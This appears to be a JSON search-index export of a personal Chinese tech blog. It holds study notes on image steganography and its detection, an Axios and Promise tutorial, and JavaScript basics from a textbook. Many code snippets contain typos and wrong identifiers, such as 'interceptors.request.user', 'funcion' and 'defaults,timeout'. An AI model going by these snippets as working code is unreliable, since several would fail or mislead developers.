调色板；\n（1）调色板表数据：修改调色表值；\n（2）实际图像点索引值：危险，相邻索引颜色差异会很大；\n灰度图三种颜色必须一起修改优缺点：简单，健壮性差；\n3.基于量化编码4.二值图像中的信息隐藏传真、徽标：冗余信息少；\nZhao方法：特定区域中黑色图像的个数$$区域内黑色数量大于1/2，嵌入0，否则嵌入1；$$\n不能修改太多，需要修改太多的设定为无效项；\n5.游程方法m为0，游程长度为偶数，m1，为奇数\n（二）变换域隐藏技术在载体重要部位隐藏，抗攻击，不可察觉；\n1.DCT变换8*8块，安装Zig-Zag排列，最重要的在前面\n隐藏方法：中频系数修改$$x’(i,j)=x(i,j)+am(i)$$\n$$x’(i,j)=x(i,j)(1+am(i))$$\n需要原图像，经过相减除以a求出m\n利用特定数的相对大小来进行信息隐藏伪随机选择$$Bi(u1,v2)   &gt;,     m=1$$\n$$Bi(u2,v2)  &lt;,  m=0$$\nNote:\n\n当m值大小与m不一致时，大小关系互换；\n互换影响太大就设定为无效项；\n还有三项不等关系的方法；\n\n2.DWT信息隐藏小波变换低频部分、水平细节、垂直细节、对角线细节\n类似DCT系数隐藏的方法任然适用；\n图像隐藏算法\n初始化\n小波变换，主要是对低频分量进行隐藏\n矢量量化，映射\n加密和信息隐藏\n\n3.DFT隐藏方法参数有虚数实数，实数部分要求对称；\n4.回声隐藏算法5.算法总结\n加密强度高\n健壮性好\n\n（三）文件格式隐藏法BMP文件格式隐藏会改变文件大小\n（四）可逆信息隐藏实例1.基于直方图平移的可逆信息隐藏\n确定直方图峰值点和谷点，峰值点表示图像中样点值最多的数值点；选择峰值点整体右移直方图的目的是，空出取值最多的样点，提高嵌入容量；\n直方图右移；\n\n\n\n针对直方图空隙进行信息嵌入，嵌入规则如下：$$若嵌入的bit为1,则将pp的值+1；$$\n$$若嵌入的比特为0，则pp值不变；$$\n详细链接：\nhttps://blog.csdn.net/q15516221118/article/details/113617278\n\n\n三、信息隐藏分析1.基本分析步骤\n检测是否藏有秘密信息；\n如果有，如何进行秘密信息的提取；怎样在不被接受者发现的情况下破坏；\n\n2.发现隐藏信息\n时域隐藏，变换域隐藏，统计等；\n\n根据可能的方法判断分析载体的变化来判断是否有信息的隐藏；\n\nLSB方法：主观上，查看有无明显的变化；客观上，统计分析噪声特性；\n\n调色板方法：一般调色板按照颜色的使用多少排列。是否违反或者有很多空余的调色板索引；\n\n变换域方法：尝试变换查找；\n\n变形技术：主管分析；\n\n载体生成技术：是否符合人类阅读习惯；\n\n文件隐藏：文件大小是否异常；\n\n\n","slug":"图像信号处理基础","date":"2022-10-29T07:09:00.000Z","categories_index":"信息隐藏","tags_index":"信息隐藏","author_index":"Martin"},{"id":"497057504cdf696233ca7859e8edacd2","title":"Axios详解","content":"Axios基于promise可以用于浏览器和node.js的网络请求库一、基础定义Promise1.promise一个对象，用于传递异步操作的消息；本意上可以理解为，承诺过一段时间返回一个结果。\nbasic 其实就是一个请求发出去以后，并不能马上获得需要的数据，因此整个js代码需要暂停等待请求数据的返回\n\nPromise有三种状态：pending(等待态)，fulfiled(成功态)，rejected（失败态）；状态一旦改变就不会再变；创造promise实例后会立即执行；\n\n// 当参数a大于10且参数fn2是一个方法时 执行fn2\nfunction fn1(a, fn2) &#123;\n    if (a > 10 &amp;&amp; typeof fn2 == 'function') &#123;\n        fn2()\n    &#125;\n&#125;\nfn1(11, function() &#123;\n    console.log('this is a callback')\n&#125;)\n\n一般来说我们会碰到的回调嵌套都不会很多，一般就一到两级，但是某些情况下，回调嵌套很多时，代码就会非常繁琐，会给我们的编程带来很多的麻烦，这种情况俗称——回调地狱。\n这时候我们的promise就应运而生、粉墨登场了\npromise主要解决两个问题：\n\n回调地狱，代码难以维护，常常第一个函数的输出是第二个函数的输入；\n\n支持多个并发请求，并从请求中获取数据；可以解决异步的问题；\nbasic建议使用ES6箭头函数的编码方式，获得数据，处理数据，处理完成，下一步~\n\n2.promise用法let p=new Promise((resolve,reject)=>&#123;\n    //一些异步操作\n    setTimeout(()=>&#123;\n        console.log(\"Finished.\");\n        resolve(\"成功！\")；\n    &#125;，2000)\n&#125;)\n\n//promise的构造函数接受一个函数类型的参数，并且需要传入两个参数：\nresolve：异步操作执行成功之后的回调函数；\nreject：异步操作执行失败后的回调函数；\n\nthen 链式操作：\n表面上，promise只是简化层层回调，实质上，用维护状态、传递状态的方法使得回调函数能够及时调用；\n正确场景：\np.then((data))=>&#123;\n    cosnsole.log(data);\n&#125;).then((data)=>&#123;\n    console.log(data);\n&#125;).then((data)=>P&#123;\n        console.log(data);\n        &#125;);\n\n3.reject用法把promise的状态设置为rejected，这样在then中就能捕捉到，然后执行“失败”情况的回调；\nlet p=new Promise((resolve,reject)=>&#123;\n    setTimeout(function()&#123;\n        var num=Math.ceil(Math.random()*10);\n        if(num&lt;=5)\n            &#123;\n                resolve(num);\n            &#125;else\n                &#123;\n                    reject(\"数字太大！\")；\n                &#125;\n    &#125;,2000);\n&#125;)；\np.then((data)=>&#123;\n    console.log(\"Resolved\",data);\n&#125;,(err)=>&#123;\n    console.log(\"Rejected\",err);\n&#125;\n      )\n\n4.catch用法catch和then的第二个参数一样用来指定reject的回调；\np.then((data)=>&#123;\n    console.log(\"Resolved\",data);\n&#125;).catch((err)=>&#123;\n    console.log(\"Rejected\",err);\t\t\t//抛出异常\n&#125;)\n//如果执行resolve的回调时，如果抛出异常，并不会报错停止js，而是进入到catch方法；\np.then((data) => &#123;\n    console.log('resolved',data);\n    console.log(somedata); //此处的somedata未定义\n&#125;)\n.catch((err) => &#123;\n    console.log('rejected',err);\n&#125;);\n\n5.all的用法谁跑得慢，以谁为准执行回调；all接受一个数组参数，里面的值最终都算返回Promise对象；\nall方法提供了并行执行异步操作的能力，并且在所有异步操作执行完成之后才执行回调；\nlet Promose1=new Promise(function(resolve,reject)&#123;&#125;)\nlet Promise2=new Promise(function(resolve,reject)&#123;&#125;)\nlet Promise3=new Promise(function(resolve,reject)&#123;&#125;)\n\nlet p=Promise.all([Promise1,Promise2,Promise3])\n\np.then(function()&#123;\n   \tconsole.log(\"三个都执行成功则成功\")\n&#125;,function()&#123;\n    console.log(\"只要有失败则失败\")\n&#125;)\n\n使用场景：一个游戏需要很多素材，只有所有素材都下载到本地之后，才开始初始化；\nlet video=new Promise(funcion(resolve,reject)&#123;&#125;);\nlet word=new Promise(function(resolve,reject)&#123;&#125;);\n\nlet p=Promise.all([video,word]);\n\np.them(funcion()&#123;\n       console.log(\"开始初始化！\");\n       &#125;,function()&#123;\n           console.log(\"游戏初始化失败\")；\n       &#125;)\n\n6.race用法谁跑的块，以谁为准执行回调；\n可以用race给某个异步请求设置超时时间，并且在超时后执行相应的操作，代码如下：\nfunction requestImg()&#123;\n\tvar p = new Promise((resolve,reject)=>&#123;\n        var img =new Img();\n        img.onload=function()&#123;\n            resolve(img);\n        &#125;\n        img.src='img path';\n    &#125;);\n    return p;\n&#125;\n\n//延时函数，用于计时\nfunction timeout()&#123;\n    var p=new Promise((resolve,reject)=>&#123;\n        setTimeout(()=>&#123;\n            reject(\"请求图片超时！\");\n        &#125;,5000);\n    &#125;);\n    return p;\n&#125;\n//调用\nPromise.race([requestImg(), timeout()]).then((data) =>&#123;\n    console.log(data);\n&#125;).catch((err) => &#123;\n    console.log(err);\n&#125;);\n\n二、基础定义Axios服务端它使用原生 node.js http 模块, 而在客户端 (浏览端) 则使用 XMLHttpRequests。1.特性\n从浏览器创建 XMLHttpRequests\n从 node.js 创建 http 请求\n支持 Promise API\n拦截请求和响应\n转换请求和响应数据\n取消请求\n自动转换JSON数据\n客户端支持防御XSRF\n\n2.安装使用npm install axios\n//yarn\n yarn add axios\n\nGet请求const axios=require('axios');\n\n//向给定的ID用户发起请求\naxios.get('/user?ID=12345').then(function(response)&#123;\n    console.log(\"成功！\")\n&#125;).catch(function(err)&#123;\n    console.log(\"失败\");\n&#125;).then(function()&#123;\n    console.log(\"总是执行的部分\");\n&#125;)\n\n//以上代码可以等价于\naxios.get('/user',&#123;\n    params:&#123;\n        ID:12345\n    &#125;\n&#125;).then(function(response)&#123;\n    console.log(\"成功！\")\n&#125;).catch(function(err)&#123;\n    console.log(\"失败\");\n&#125;).then(function()&#123;\n    console.log(\"总是执行的部分\");\n&#125;)\n\n\nPOST请求axios.post('/user',&#123;\n    fiestName:'Fred',\n    lastName:'Smith'\n&#125;).then(function(response)&#123;\n    console.log(response);\n&#125;).catch(function(err)&#123;\n    console.log(err);\n&#125;);\n\n//多个POST请求\nfunction getUserAccount()&#123;\n    return axios.get('/user/12345');\n&#125;\n\nfunction getUserPermissions()&#123;\n    return axios.get('/user/12345/permissions');\n&#125;\n\nPromise.all([getUserAccount(),getUserPermissions()]).then(function(results)&#123;\n    const acct=results[0];\n    const perm=results[1];\n&#125;)\n\n3.Axops API可以向 axios 传递相关配置来创建请求\n//发起一个post请求\naxios(&#123;\n\tmethod:'post',\n    url:'/user/12345',\n    data:&#123;\n        firstname:'Martin',\n        lastname:'Smith'\n    &#125;\n&#125;);\n\n//在nodeJS用GET请求远程图片\naxios(&#123;\n    method:'get',\n    url:'http://test/123',\n    responseType:'stream'\n&#125;).then((response)=>&#123;\n    response.data.pipe(fs.createWriteStream('test.jpg'));\n&#125;);\n\n4.请求配置创建请求时可以用配置选项；只有url是必须的，如果没有指定method，则默认使用GET；\n&#123;\n    url:'/api/user',          //用于请求的服务器URL\n    method:'get',\n    baseUrl:'https://192.168.0.1:35000',\t\t//自动加在url前；\n    transformRequest:[\n        function(data,headers)&#123;\n            //对即将发送的data进行处理；\n            return processedData;\n        &#125;\n    ],\n    transformResponse:[\n        function(response)&#123;\n            //对收到的响应进行处理；\n            return processedResponse;\n        &#125;\n    ],\n    headers:&#123;'X-Requested-With': 'XMLHttpRequest'&#125;,\n    params:&#123;\n        ID:12345\t\t//与请求一起发送的url参数；\n    &#125;，\n    //data是作为请求体被发送的数据，仅适用于PUT，POST，DELETE和PATCH方法；\n    // 在没有设置 `transformRequest` 时，则必须是以下类型之一:\n  \t// - string, plain object, ArrayBuffer, ArrayBufferView, URLSearchParams\n  \t// - 浏览器专属: FormData, File, Blob\n  \t// - Node 专属: Stream, Buffer\n    data:&#123;\n    firstname:'Fred',\n\t&#125;,\n      // 发送请求体数据的可选语法\n      // 请求方式 post\n      // 只有 value 会被发送，key 则不会\n      data: 'Country=Brasil&amp;City=Belo Horizonte',\n\n\t//timeout:指定请求超时的毫秒数；默认0ms；\n\ttimeout:1000,  \n\t\n\t//跨域时是否需要凭证；\n\twithCredentials:false,\n  // `adapter` 允许自定义处理请求，这使测试更加容易。\n  // 返回一个 promise 并提供一个有效的响应 （参见 lib/adapters/README.md）。\n  adapter: function (config) &#123;\n    /* ... */\n  &#125;,\n\n  // `auth` HTTP Basic Auth\n  auth: &#123;\n    username: 'janedoe',\n    password: 's00pers3cret'\n  &#125;,\n\n  // `responseType` 表示浏览器将要响应的数据类型\n  // 选项包括: 'arraybuffer', 'document', 'json', 'text', 'stream'\n  // 浏览器专属：'blob'\n  responseType: 'json', // 默认值\n\n  // `responseEncoding` 表示用于解码响应的编码 (Node.js 专属)\n  // 注意：忽略 `responseType` 的值为 'stream'，或者是客户端请求\n  // Note: Ignored for `responseType` of 'stream' or client-side requests\n  responseEncoding: 'utf8', // 默认值\n\n  // `xsrfCookieName` 是 xsrf token 的值，被用作 cookie 的名称\n  xsrfCookieName: 'XSRF-TOKEN', // 默认值\n\n  // `xsrfHeaderName` 是带有 xsrf token 值的http 请求头名称\n  xsrfHeaderName: 'X-XSRF-TOKEN', // 默认值\n\n  // `onUploadProgress` 允许为上传处理进度事件\n  // 浏览器专属\n  onUploadProgress: function (progressEvent) &#123;\n    // 处理原生进度事件\n  &#125;,\n\n  // `onDownloadProgress` 允许为下载处理进度事件\n  // 浏览器专属\n  onDownloadProgress: function (progressEvent) &#123;\n    // 处理原生进度事件\n  &#125;,\n\n  // `maxContentLength` 定义了node.js中允许的HTTP响应内容的最大字节数\n  maxContentLength: 2000,\n\n  // `maxBodyLength`（仅Node）定义允许的http请求内容的最大字节数\n  maxBodyLength: 2000,\n\n  // `validateStatus` 定义了对于给定的 HTTP状态码是 resolve 还是 reject promise。\n  // 如果 `validateStatus` 返回 `true` (或者设置为 `null` 或 `undefined`)，\n  // 则promise 将会 resolved，否则是 rejected。\n  validateStatus: function (status) &#123;\n    return status >= 200 &amp;&amp; status &lt; 300; // 默认值\n  &#125;,\n\n  // `maxRedirects` 定义了在node.js中要遵循的最大重定向数。\n  // 如果设置为0，则不会进行重定向\n  maxRedirects: 5, // 默认值\n\n  // `socketPath` 定义了在node.js中使用的UNIX套接字。\n  // e.g. '/var/run/docker.sock' 发送请求到 docker 守护进程。\n  // 只能指定 `socketPath` 或 `proxy` 。\n  // 若都指定，这使用 `socketPath` 。\n  socketPath: null, // default\n\n  // `httpAgent` and `httpsAgent` define a custom agent to be used when performing http\n  // and https requests, respectively, in node.js. This allows options to be added like\n  // `keepAlive` that are not enabled by default.\n  httpAgent: new http.Agent(&#123; keepAlive: true &#125;),\n  httpsAgent: new https.Agent(&#123; keepAlive: true &#125;),\n\n  // `proxy` 定义了代理服务器的主机名，端口和协议。\n  // 您可以使用常规的`http_proxy` 和 `https_proxy` 环境变量。\n  // 使用 `false` 可以禁用代理功能，同时环境变量也会被忽略。\n  // `auth`表示应使用HTTP Basic auth连接到代理，并且提供凭据。\n  // 这将设置一个 `Proxy-Authorization` 请求头，它会覆盖 `headers` 中已存在的自定义 `Proxy-Authorization` 请求头。\n  // 如果代理服务器使用 HTTPS，则必须设置 protocol 为`https`\n  proxy: &#123;\n    protocol: 'https',\n    host: '127.0.0.1',\n    port: 9000,\n    auth: &#123;\n      username: 'mikeymike',\n      password: 'rapunz3l'\n    &#125;\n  &#125;,\n\n  // see https://axios-http.com/zh/docs/cancellation\n  cancelToken: new CancelToken(function (cancel) &#123;\n  &#125;),\n\n  // `decompress` indicates whether or not the response body should be decompressed \n  // automatically. If set to `true` will also remove the 'content-encoding' header \n  // from the responses objects of all decompressed responses\n  // - Node only (XHR cannot turn off decompression)\n  decompress: true // 默认值\n&#125;\n\n\n5.响应结构&#123;\n\t//data为服务器响应\n    data:&#123;&#125;,\n    \n    //状态码\n    status:200,\n    \n    //HTTP状态信息\n    statusText:'OK',\n    \n    //服务器响应头\n    headers:&#123;&#125;,\n    //axios请求的配置信息；\n    config:&#123;&#125;,\n    //生成响应的请求\n    // 在node.js中它是最后一个ClientRequest实例 (in redirects)，\n  \t// 在浏览器中则是 XMLHttpRequest 实例\n    request:&#123;&#125;,\n&#125;\n\n\n\n三、默认配置1.全局axios默认值axios.defaults.baseURL = 'https://api.example.com';\naxios.defaults.headers.common['Authorization'] = AUTH_TOKEN;\naxios.defaults.headers.post['Content-Type'] = 'application/x-www-form-urlencoded';\n\n2.自定义实例默认值// 创建实例时配置默认值\nconst instance = axios.create(&#123;\n  baseURL: 'https://api.example.com'\n&#125;);\n\n// 创建实例后修改默认值\ninstance.defaults.headers.common['Authorization'] = AUTH_TOKEN;\n\n3.配置的优先级//此时默认超时时间为0\nconst instance=axios.create();\n\n//重写库的超时默认值\ninstance.defaults,timeout=2500;\n\n//重写超时时间\ninstance.get('/logout',&#123;\n    timeout:5000\n&#125;);\n\n4.拦截器请求或者响应被then或者catch处理之前拦截\n//添加请求拦截器\naxios.interceptors.request.user(function(config)&#123;\n    //发送请求前做点啥~\n    return config;\n&#125;,function(error)&#123;\n    //对发送中的错误做点啥~\n    return Promise.reject(error);\n&#125;);\n\n//添加响应拦截器\naxios.interceptors.response.user(function(response)&#123;\n    //2xx范围内的状态码都会触发此函数哦~\n    //do something.\n    return response;\n&#125;,function(error)&#123;\n    //2xx以外的状态码都会触发此函数哦~\n    //do something.\n    return error;\n&#125;);\n\n移除拦截器const interceptor=axios.interceptors.request.user(function()&#123;\n\n&#125;);\naxios.interceptors.request.eject(interceptor);\n\n添加拦截器const instance = axios.create();\ninstance.interceptors.request.use(function () &#123;/*...*/&#125;);\n\n5.错误处理axios.get('/user/12345').catch(function(error)&#123;\n    if(error.response)&#123;\n        //请求成功发出且服务器响应了状态码，但是状态码超出了2xx\n        console.log(error.response.data);\n    &#125;else if(error.request)&#123;\n        //请求已经发起成功，但是没有收到响应；\n        //error.request是浏览器中XMLHttpRequest的实例；\n        console.log(error.request);\n    &#125;else&#123;\n        //请求发出时出问题\n        console.log('Error:',error.message);\n    &#125;\n    console.log(error.coonfig);\n&#125;)\n\n使用validataStatus配置选项，可以自定义抛出错误HttpCode;axios.get('/user/12345',&#123;\n    validateStatus:function(status)&#123;\n        return status>500;\n    &#125;\n&#125;)\n\n使用 toJSON 可以获取更多关于HTTP错误的信息。axios.get('/user/12345')\n  .catch(function (error) &#123;\n    console.log(error.toJSON());\n  &#125;);\n\n6.取消请求fetechAPI  AbortController取消请求const comtrollor=new AbortController();\n\naxios.get('/foo/bar',&#123;\n    signal:controller.singal\n&#125;).then(function(response)&#123;\n    \n&#125;);\n\ncontrollor.abort();\n\nCancelToken deprecated(已弃用)7.请求体编码默认情况下，axios将js对象序列化为json；\n以application/x-www-form-urlencoded格式发送数据；\n浏览器const params=new URLSearchParams();\nparams.append('param1','value1');\nparams.append('params2','value2');\naxios.post('/foo',params);\n\n//注意，并不是所有的浏览器都支持URLResearchParams\n\n//qs库编码数据\nconst qs=require('qs');\naxios.post('/foo',qs.stringify(&#123;\n    'bar':123\n&#125;));\n\n或者ES6方法\n\nimport qs from 'qs';\ncosnt data=&#123;\n    'bar':123\n&#125;;\n\nconst options=&#123;\n    method:'POST',\n    headers:&#123; 'content-type': 'application/x-www-form-urlencoded' &#125;,\n    data:qs.stringify(data),\n    url,\n&#125;;\naxios(options);\n\nNodeJS 使用querystring\nconst querystring = require('querystring');\naxios.post('http://something.com/', querystring.stringify(&#123; foo: 'bar' &#125;));\n\nconst url = require('url');\nconst params = new url.URLSearchParams(&#123; foo: 'bar' &#125;);\naxios.post('http://something.com/', params.toString());\n\n//如果需要对嵌套对象进行字符串化处理，则最好使用 qs 库，因为 querystring 方法在该用例中存在已知问题\n\nForm Data\nconst FormData=require('form-data');\n\nconst form =new FormData();\nform.append('filed1','value1');\n\naxios.post('https://example.com',form,&#123;headers:from.getHeaders()&#125;)\n\n拦截器\naxios.interceptors.request.use(config=>&#123;\n    if(config.data instanceof FormData)&#123;\n        Object.assign(config.headers,config.data.getHeaders());\n    &#125;\n    retun config;\n&#125;)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","slug":"Axios详解","date":"2022-10-27T08:09:00.000Z","categories_index":"JS","tags_index":"JS","author_index":"Martin"},{"id":"51d3872cd56d489d412dadd4338316da","title":"Vue笔记","content":"JS一、各司其职\nHTML、CSS、JS职能分离\n\n\n二、组件封装\n好的UI组件具有正确性、拓展性、复用性\n\n1.结构轮播图其实是一个列表结构；\n通过css将图片层叠在一起；\n2.展现效果3.行为API 功能\nEvent 控制流：使用自定义的事件来解耦\n4.改进空间\n解耦+\n\n三、过程抽象\n应用函数时编程思想\n\n\n用来处理局部细节控制的方法\n函数式编程思想的基础应用\n\n1.once\n一个方法设置了timewaite以后，如果在time内多次激活方法会报错，这个时候需要用once方法来禁止多次调用。\nbuttons.forEach((button)=>&#123;\n    button.addEventListener('click',once((evt)=>&#123;\n        const target=evt.target;\n        setTimeout(()=>&#123;\n            list.removeChild(target);\n        &#125;,2000)\t\t\t\t//设置2000ms\n    &#125;)，&#123;once:true&#125;)；\t\t//仅允许调用一次；\n&#125;)；\n\n//once function的实现\n\nfunction once(fn)&#123;\n    //外部闭包\n    return function(...args)&#123;\n        //内部闭包\n        if(fn)&#123;\n            const ret=fn.apply(this,args);\n            fn=null;\n            return ret;\n        &#125;\n    &#125;\n&#125;\n\n为了能够让”只执行一次“的需求覆盖不同的事件处理，我们可以将这个需求剥离出来。这个过程，我们成为过程抽象\n","slug":"JS","date":"2022-10-11T18:51:45.000Z","categories_index":"前端","tags_index":"笔记,JS","author_index":"Martin"},{"id":"51d3872cd56d489d412dadd4338316da","title":"Vue笔记","content":"JS高级程序设计一、基础基础基础1.基础语法\nfor-in\n\n//for-in语法是一种精准的迭代语句，可以用来枚举对象的属性；\nfor(property in expression)&#123;\n    statement;\n&#125;\n\nfor(var propName in window)&#123;\n    document.write(propName);\n&#125;\n\n\nwith\n\n//将代码的作用域设置到一个特定的对象中\nwith(expression) statement;\n\n2.变量、作用域、内存\n基本类型和引用类型的值\n\n基本数据类型（可以直接操作保存在变量中的实际的值）：Undefined、NULL、Boolean、Number、String；\n引用类型的值是保存在内存中的对象；\n与其他语言不同，JS不允许直接访问内存中的位置；在操作对象时，实际操作的是对象的引用；\n\n复制变量值\n\n从一个变量向另一个变量复制基本类型和引用类型时存在不同；\n复制基本类型会创建基本类型的副本：\n\n当一个变量赋值引用类型的值，同样也会将存储的值复制一份放到新变量分配的空间中国，不同的是，这个值的副本其实是一个指针，而这个指针指向存储在堆中的一个对象；\n复制结束后，两个变量实际上引用同一个对象；因此改变其中一个变量会改变另一个；\n\n\n传递参数\n\nES中所有的参数都是按值传递的；\nfunction add(num)&#123;\n    num+=10;\n    return num;\n&#125;\n\nvar count=20;\nvar result=add(count);\n\n//result=30,count=20不变\n//这是因为addTen()中的参数num是count的值传递，而不是引用传递两者是相互无关的。\n\n\n检测类型\n\n要检测一个变量是不是基本类型？（typeof)\n检测基本数据类型时，typeof很好用，但是检测引用类型用处不大，需要使用instanceof;\ntpyeof s;\nvariable instanceof constructor\n\n\n作用域\n\nWeb浏览器中，全局执行环境被认为是window对象；\n每个函数都有自己的执行环境，当执行流进入一个函数时，函数的环境会被推入一个环境栈中；\n代码在一个环境中执行时，会创建变量对象的一个作用域链（scope chanin）：其作用是为了保证对执行环境有权访问的所有变量和函数有序的访问；\n\n延长作用域链\n\n有些语句可以在作用域链的前端临时增加一个变量对象，该变量对象在代码执行后被移除；\ntry-catch语句的catch\nwith语句\n\n3.垃圾收集JS具有自动垃圾收集机制，执行环境会负责管理代码执行过程中使用的内存。\n原理：找出不再使用的变量，释放内存；垃圾收集器按照固定时间间隔周期性执行；\n\n标记清除\n\n当变量进入环境，标记为进入环境，方法可能是设置标志位；\n\n引用计数\n\n记录每个值被引用的次数，当声明了一个变量并且将一个引用类型赋给该变量，则这个值的引用次数就是1；\n一个值赋给一个变量，引用次数+1；相反对这个值引用的变量右取得了另一个值，则引用次数-1；\n问题：\nfunction problem()&#123;\n    var objA=new Object();\n    var objB=new object();\n    \n    objectA.someOtherObject=objectB;\n    objectA.anotherObject=objectA;\n&#125;\n\nObjectA和B通过各自的属性相互引用，两个对象的引用次数都是2；\n这会导致函数执行后继续存在，引用次数永远不会为0；\n//解决方法\nobjA.someOther..=null;\nobjB.ano..=null;\n\n\n性能问题\n引用解除\n\nfunction createPerson(name)&#123; \n var localPerson = new Object(); \n localPerson.name = name; \n return localPerson; \n&#125; \nvar globalPerson = createPerson(\"Nicholas\"); \n// 手工解除 globalPerson 的引用\nglobalPerson = null; \n\n\n4.引用类型\n使用对象\n创建、操作数组\n理解基本的JS类型\n使用基本类型和基本包装类型\n\n\n引用类型的值（对象）是引用类型的一个实例；\n\n\nObject类型\n\n//创建Object实例\n//1.new操作符后跟Object构造函数\nvar person=new Object();\nperson.name=\"Martin\";\nperson.age=29;\n\n//2.对象字面量表示法\nvar person=&#123;\n    name:\"Martin\",\n    age:29,\n    \"address\":\"江苏省东南大学\"\t\t\t//属性名可以使用字符串，最后一个属性后不加逗号，会在早的版本导致错误\n&#125;\n\n\n\n\nArray类型\n\n//ES的数组每一项可以保存不同类型的数据；大小动态调整；\n\n//创建方式\n//1.Array构造函数；\nvar colors=new Array(20);\nvar colors=new Array(\"red\",\"blue\",\"yellow\");\n//也可以省略new\nvar colors=Array(3);\n\n//2.数组字面量表示法 \nvar colors=[\"red\",\"blue\",\"yellow\"];\n\nvar nums=[1,2,]\t\t//不要这样！！！\nvar options=[，，，] //不要这样；\n\n//添加元素\ncolor[color.length]=\"black\";\n\n//检测数组instanceof 问题在于如果存在两个不同的Array构造函数，会出错；\nif(value instanceof Array)&#123;\n    ...\n&#125;\n    \n//更好的方法\nif(Array.isArray(value))&#123;\n    ...\n&#125;\n\n//转换方法\nvar colors = [\"red\", \"blue\", \"green\"]; // 创建一个包含 3 个字符串的数组\nalert(colors.toString()); // red,blue,green \nalert(colors.valueOf()); // red,blue,green \nalert(colors); // red,blue,green。由于 alert()要接收字符串参数，所以它会在后台调用 toString()方法，由此会得到与直接调用 toString()方法相同的结果\n\n//栈方法\narray.push();\t\t//尾部压入\narray.pop();\t\t//尾部弹出\n\n//队列方法\narray.push();\t\t//尾部入队\narray.shift();\t\t//首部出队\narray.unshift();\t//首部入队\n\n//重排序方法\narray.sort();\t\t//升序排列，方法会调用每个数组项的 toString()转型方法，然后比较得到的字符串\narray.reverse();\t//反转数组\n\n//sort方法可以接受一个比较函数\nfunction compare(value1, value2) &#123; \n if (value1 &lt; value2) &#123; \n return 1; \n &#125; else if (value1 > value2) &#123; \n return -1; \n &#125; else &#123; \n return 0; \n &#125; \n&#125; \nvar values = [0, 1, 5, 10, 15]; \nvalues.sort(compare); \nalert(values); // 15,10,5,1,0\n\n\n//操作方法\n//concat（）方法基于当前数组项创建一个新的数组；\nvar colors=[\"red\",\"yellow\"];\nvar colors2=colors.concat(\"green\",[\"blue\",\"grey\"]);\n\n//slice（）方法接受一或者两个参数，为岂止位置；\n//slice方法不会影响原始数组；\nvar colors = [\"red\", \"green\", \"blue\", \"yellow\", \"purple\"]; \nvar colors2 = colors.slice(1); \nvar colors3 = colors.slice(1,4); \n\n//splice()方法\nsplice(0,2);  //删除前两项\nsplice(2,0,\"red\",\"green\")  //从位置2开始插入red,green;\nsplice(2,1,\"red\")\t\t\t//替换第二项为red；\n\n//位置方法\nindexOf()\t\t\t//从头开始查找\nlastIndexOf()\t\t//从尾部开始查找\n\n\n\n5.迭代方法\nevery():对数组中的每一项运行给定函数，如果该函数对每一项都返回 true，则返回 true。\nsome()：对数组中的每一项运行给定函数，如果该函数对任一项返回 true，则返回 true。\nfilter():对数组中的每一项运行给定函数，返回该函数会返回 true 的项组成的数组.\nforeach():：对数组中的每一项运行给定函数。这个方法没有返回值。\nmap()：对数组中的每一项运行给定函数，返回每次函数调用的结果组成的数组。\n\n6.归并方法//reduce():从第一项开始遍历；\n//reduceRight():从最后一项开始遍历；\n//接受的参数：prev,next，索引，数组对象\nvar values=[1,2,3,4,5];\n//第一次调用，pre=1.cur=2;第二次：pre=3(1+2的结果)，cur=3\nvar sum=values.reduce(function(prev,cur,index,array)=>&#123;\n                      return prev+cur;\n                      &#125;);\nalert(sum);\t\t\t\t//15\n\n\n7.正则表达式二、面向对象的程序设计\n理解对象属性\n理解并创建对象\n理解继承\n\n1.属性类型\nES中有两种属性：数据属性和访问器属性\n\n\n数据属性\n\n\n数据属性包含一个数据值的位置，在这个位置可以读取和写入值。\n\nConfigurable：表示是否能通过delete删除属性从而重新定义属性，能否修改属性的特性，能否把属性修改为访问器属性；默认为true；\nEnumerable：表示是否可以通过for-in循环返回属性；默认为true;\nWritable:表示能否修改属性的值；默认为true；\nValue:数据值，默认为undefined；\n\n\nvar person=&#123;&#125;;\nObjcect.defineProperty(person.\"name\",&#123;\n                       configuable:false,\t\t//一旦设置为false,就不能变回可配置的了；\n                       writable:false,\n                       value:\"Martin\"，\n                       &#125;);\nconsole.log(person.name);\t\t//\"Martin\"\nperson.name=\"Jack\";\t\t\t\t//无法修改，非严格模式下赋值会被忽略；严格模式下，抛出错误；\n\n\n访问器属性\n\n\n不包含数据值，包含一对儿~~\ngetter()和setter();\n\nconfigurable:表示是否能通过delete删除属性从而重新定义属性，能否修改属性的特性，能否把属性修改为访问器属性；默认为true；\nEnumerable：表示是否可以通过for-in循环返回属性；默认为true;\nGet:读取属性时调用，默认undefined；\nSet:写入属性时调用，默认undefined；\n\n\nvar book=&#123;\n    _year:2004,\t\t\t//前置下划线表示只可以通过对象方法访问；\n    edition:1\n&#125;;\n\nObjcect.defineProperty(book,\"year\",&#123;\n    get:function()&#123;\t\t\t\t\t\t//只写getter意味着不能写，写入会被忽略；严格模式报错；\n        return this._year;\n    &#125;,\n    set:function(newValue)&#123;\n        if(newValue>2004)&#123;\n            this._year=newValue;\n            this.edition+=newValue-2004;\n        &#125;\n    &#125;\n&#125;);\n\n//定义多个属性\nObject.defineProperties(book,&#123;\n    _year:&#123;\n        value:2004,\n    &#125;,\n    edition:&#123;\n        value:1\n    &#125;,\n    year:&#123;\n       get:function()&#123;\t\t\t\t\t\t//只写getter意味着不能写，写入会被忽略；严格模式报错；\n        return this._year;\n        &#125;,\n        set:function(newValue)&#123;\n            if(newValue>2004)&#123;\n                this._year=newValue;\n                this.edition+=newValue-2004;\n            &#125;\n        &#125;\n    &#125;\n&#125;)\n\n\n//读取属性的特性\nvar year=Object.getOwnPropertyDescriptor(book,\"_year\");\nconsole.log(year.value);\n\n2.创建对象\n工厂模式抽象了具体创建对象的过程，考虑到ES中无法创建类，开发人员就发明了一i中函数\n\n工厂模式function createPerson(name,age,job)&#123;\n    var o=new Objcet();\n    o.name=name;\n    o.age=age;\n    o.job=job;\n    o.sayName=function()&#123;\n        console.log(this.name);\n    &#125;;\n    return o;\n&#125;\n\n\n工厂模式虽然解决了创建多个相似对象的问题，但是没有解决对象识别的问题，无法知道一个对象的类型；\n\n构造函数模式\nES中的构造函数能船舰特定类型的对象；\n像Object和Array这样的原生构造函数，运行时会自动出现再执行环境；\n\nfunction Person(name,age,job)&#123;\n    this.name=name;\n    this.age=age;\n    this.job=job;\n    \n    this.sayName=function()&#123;\n        console.log(this.name);\n    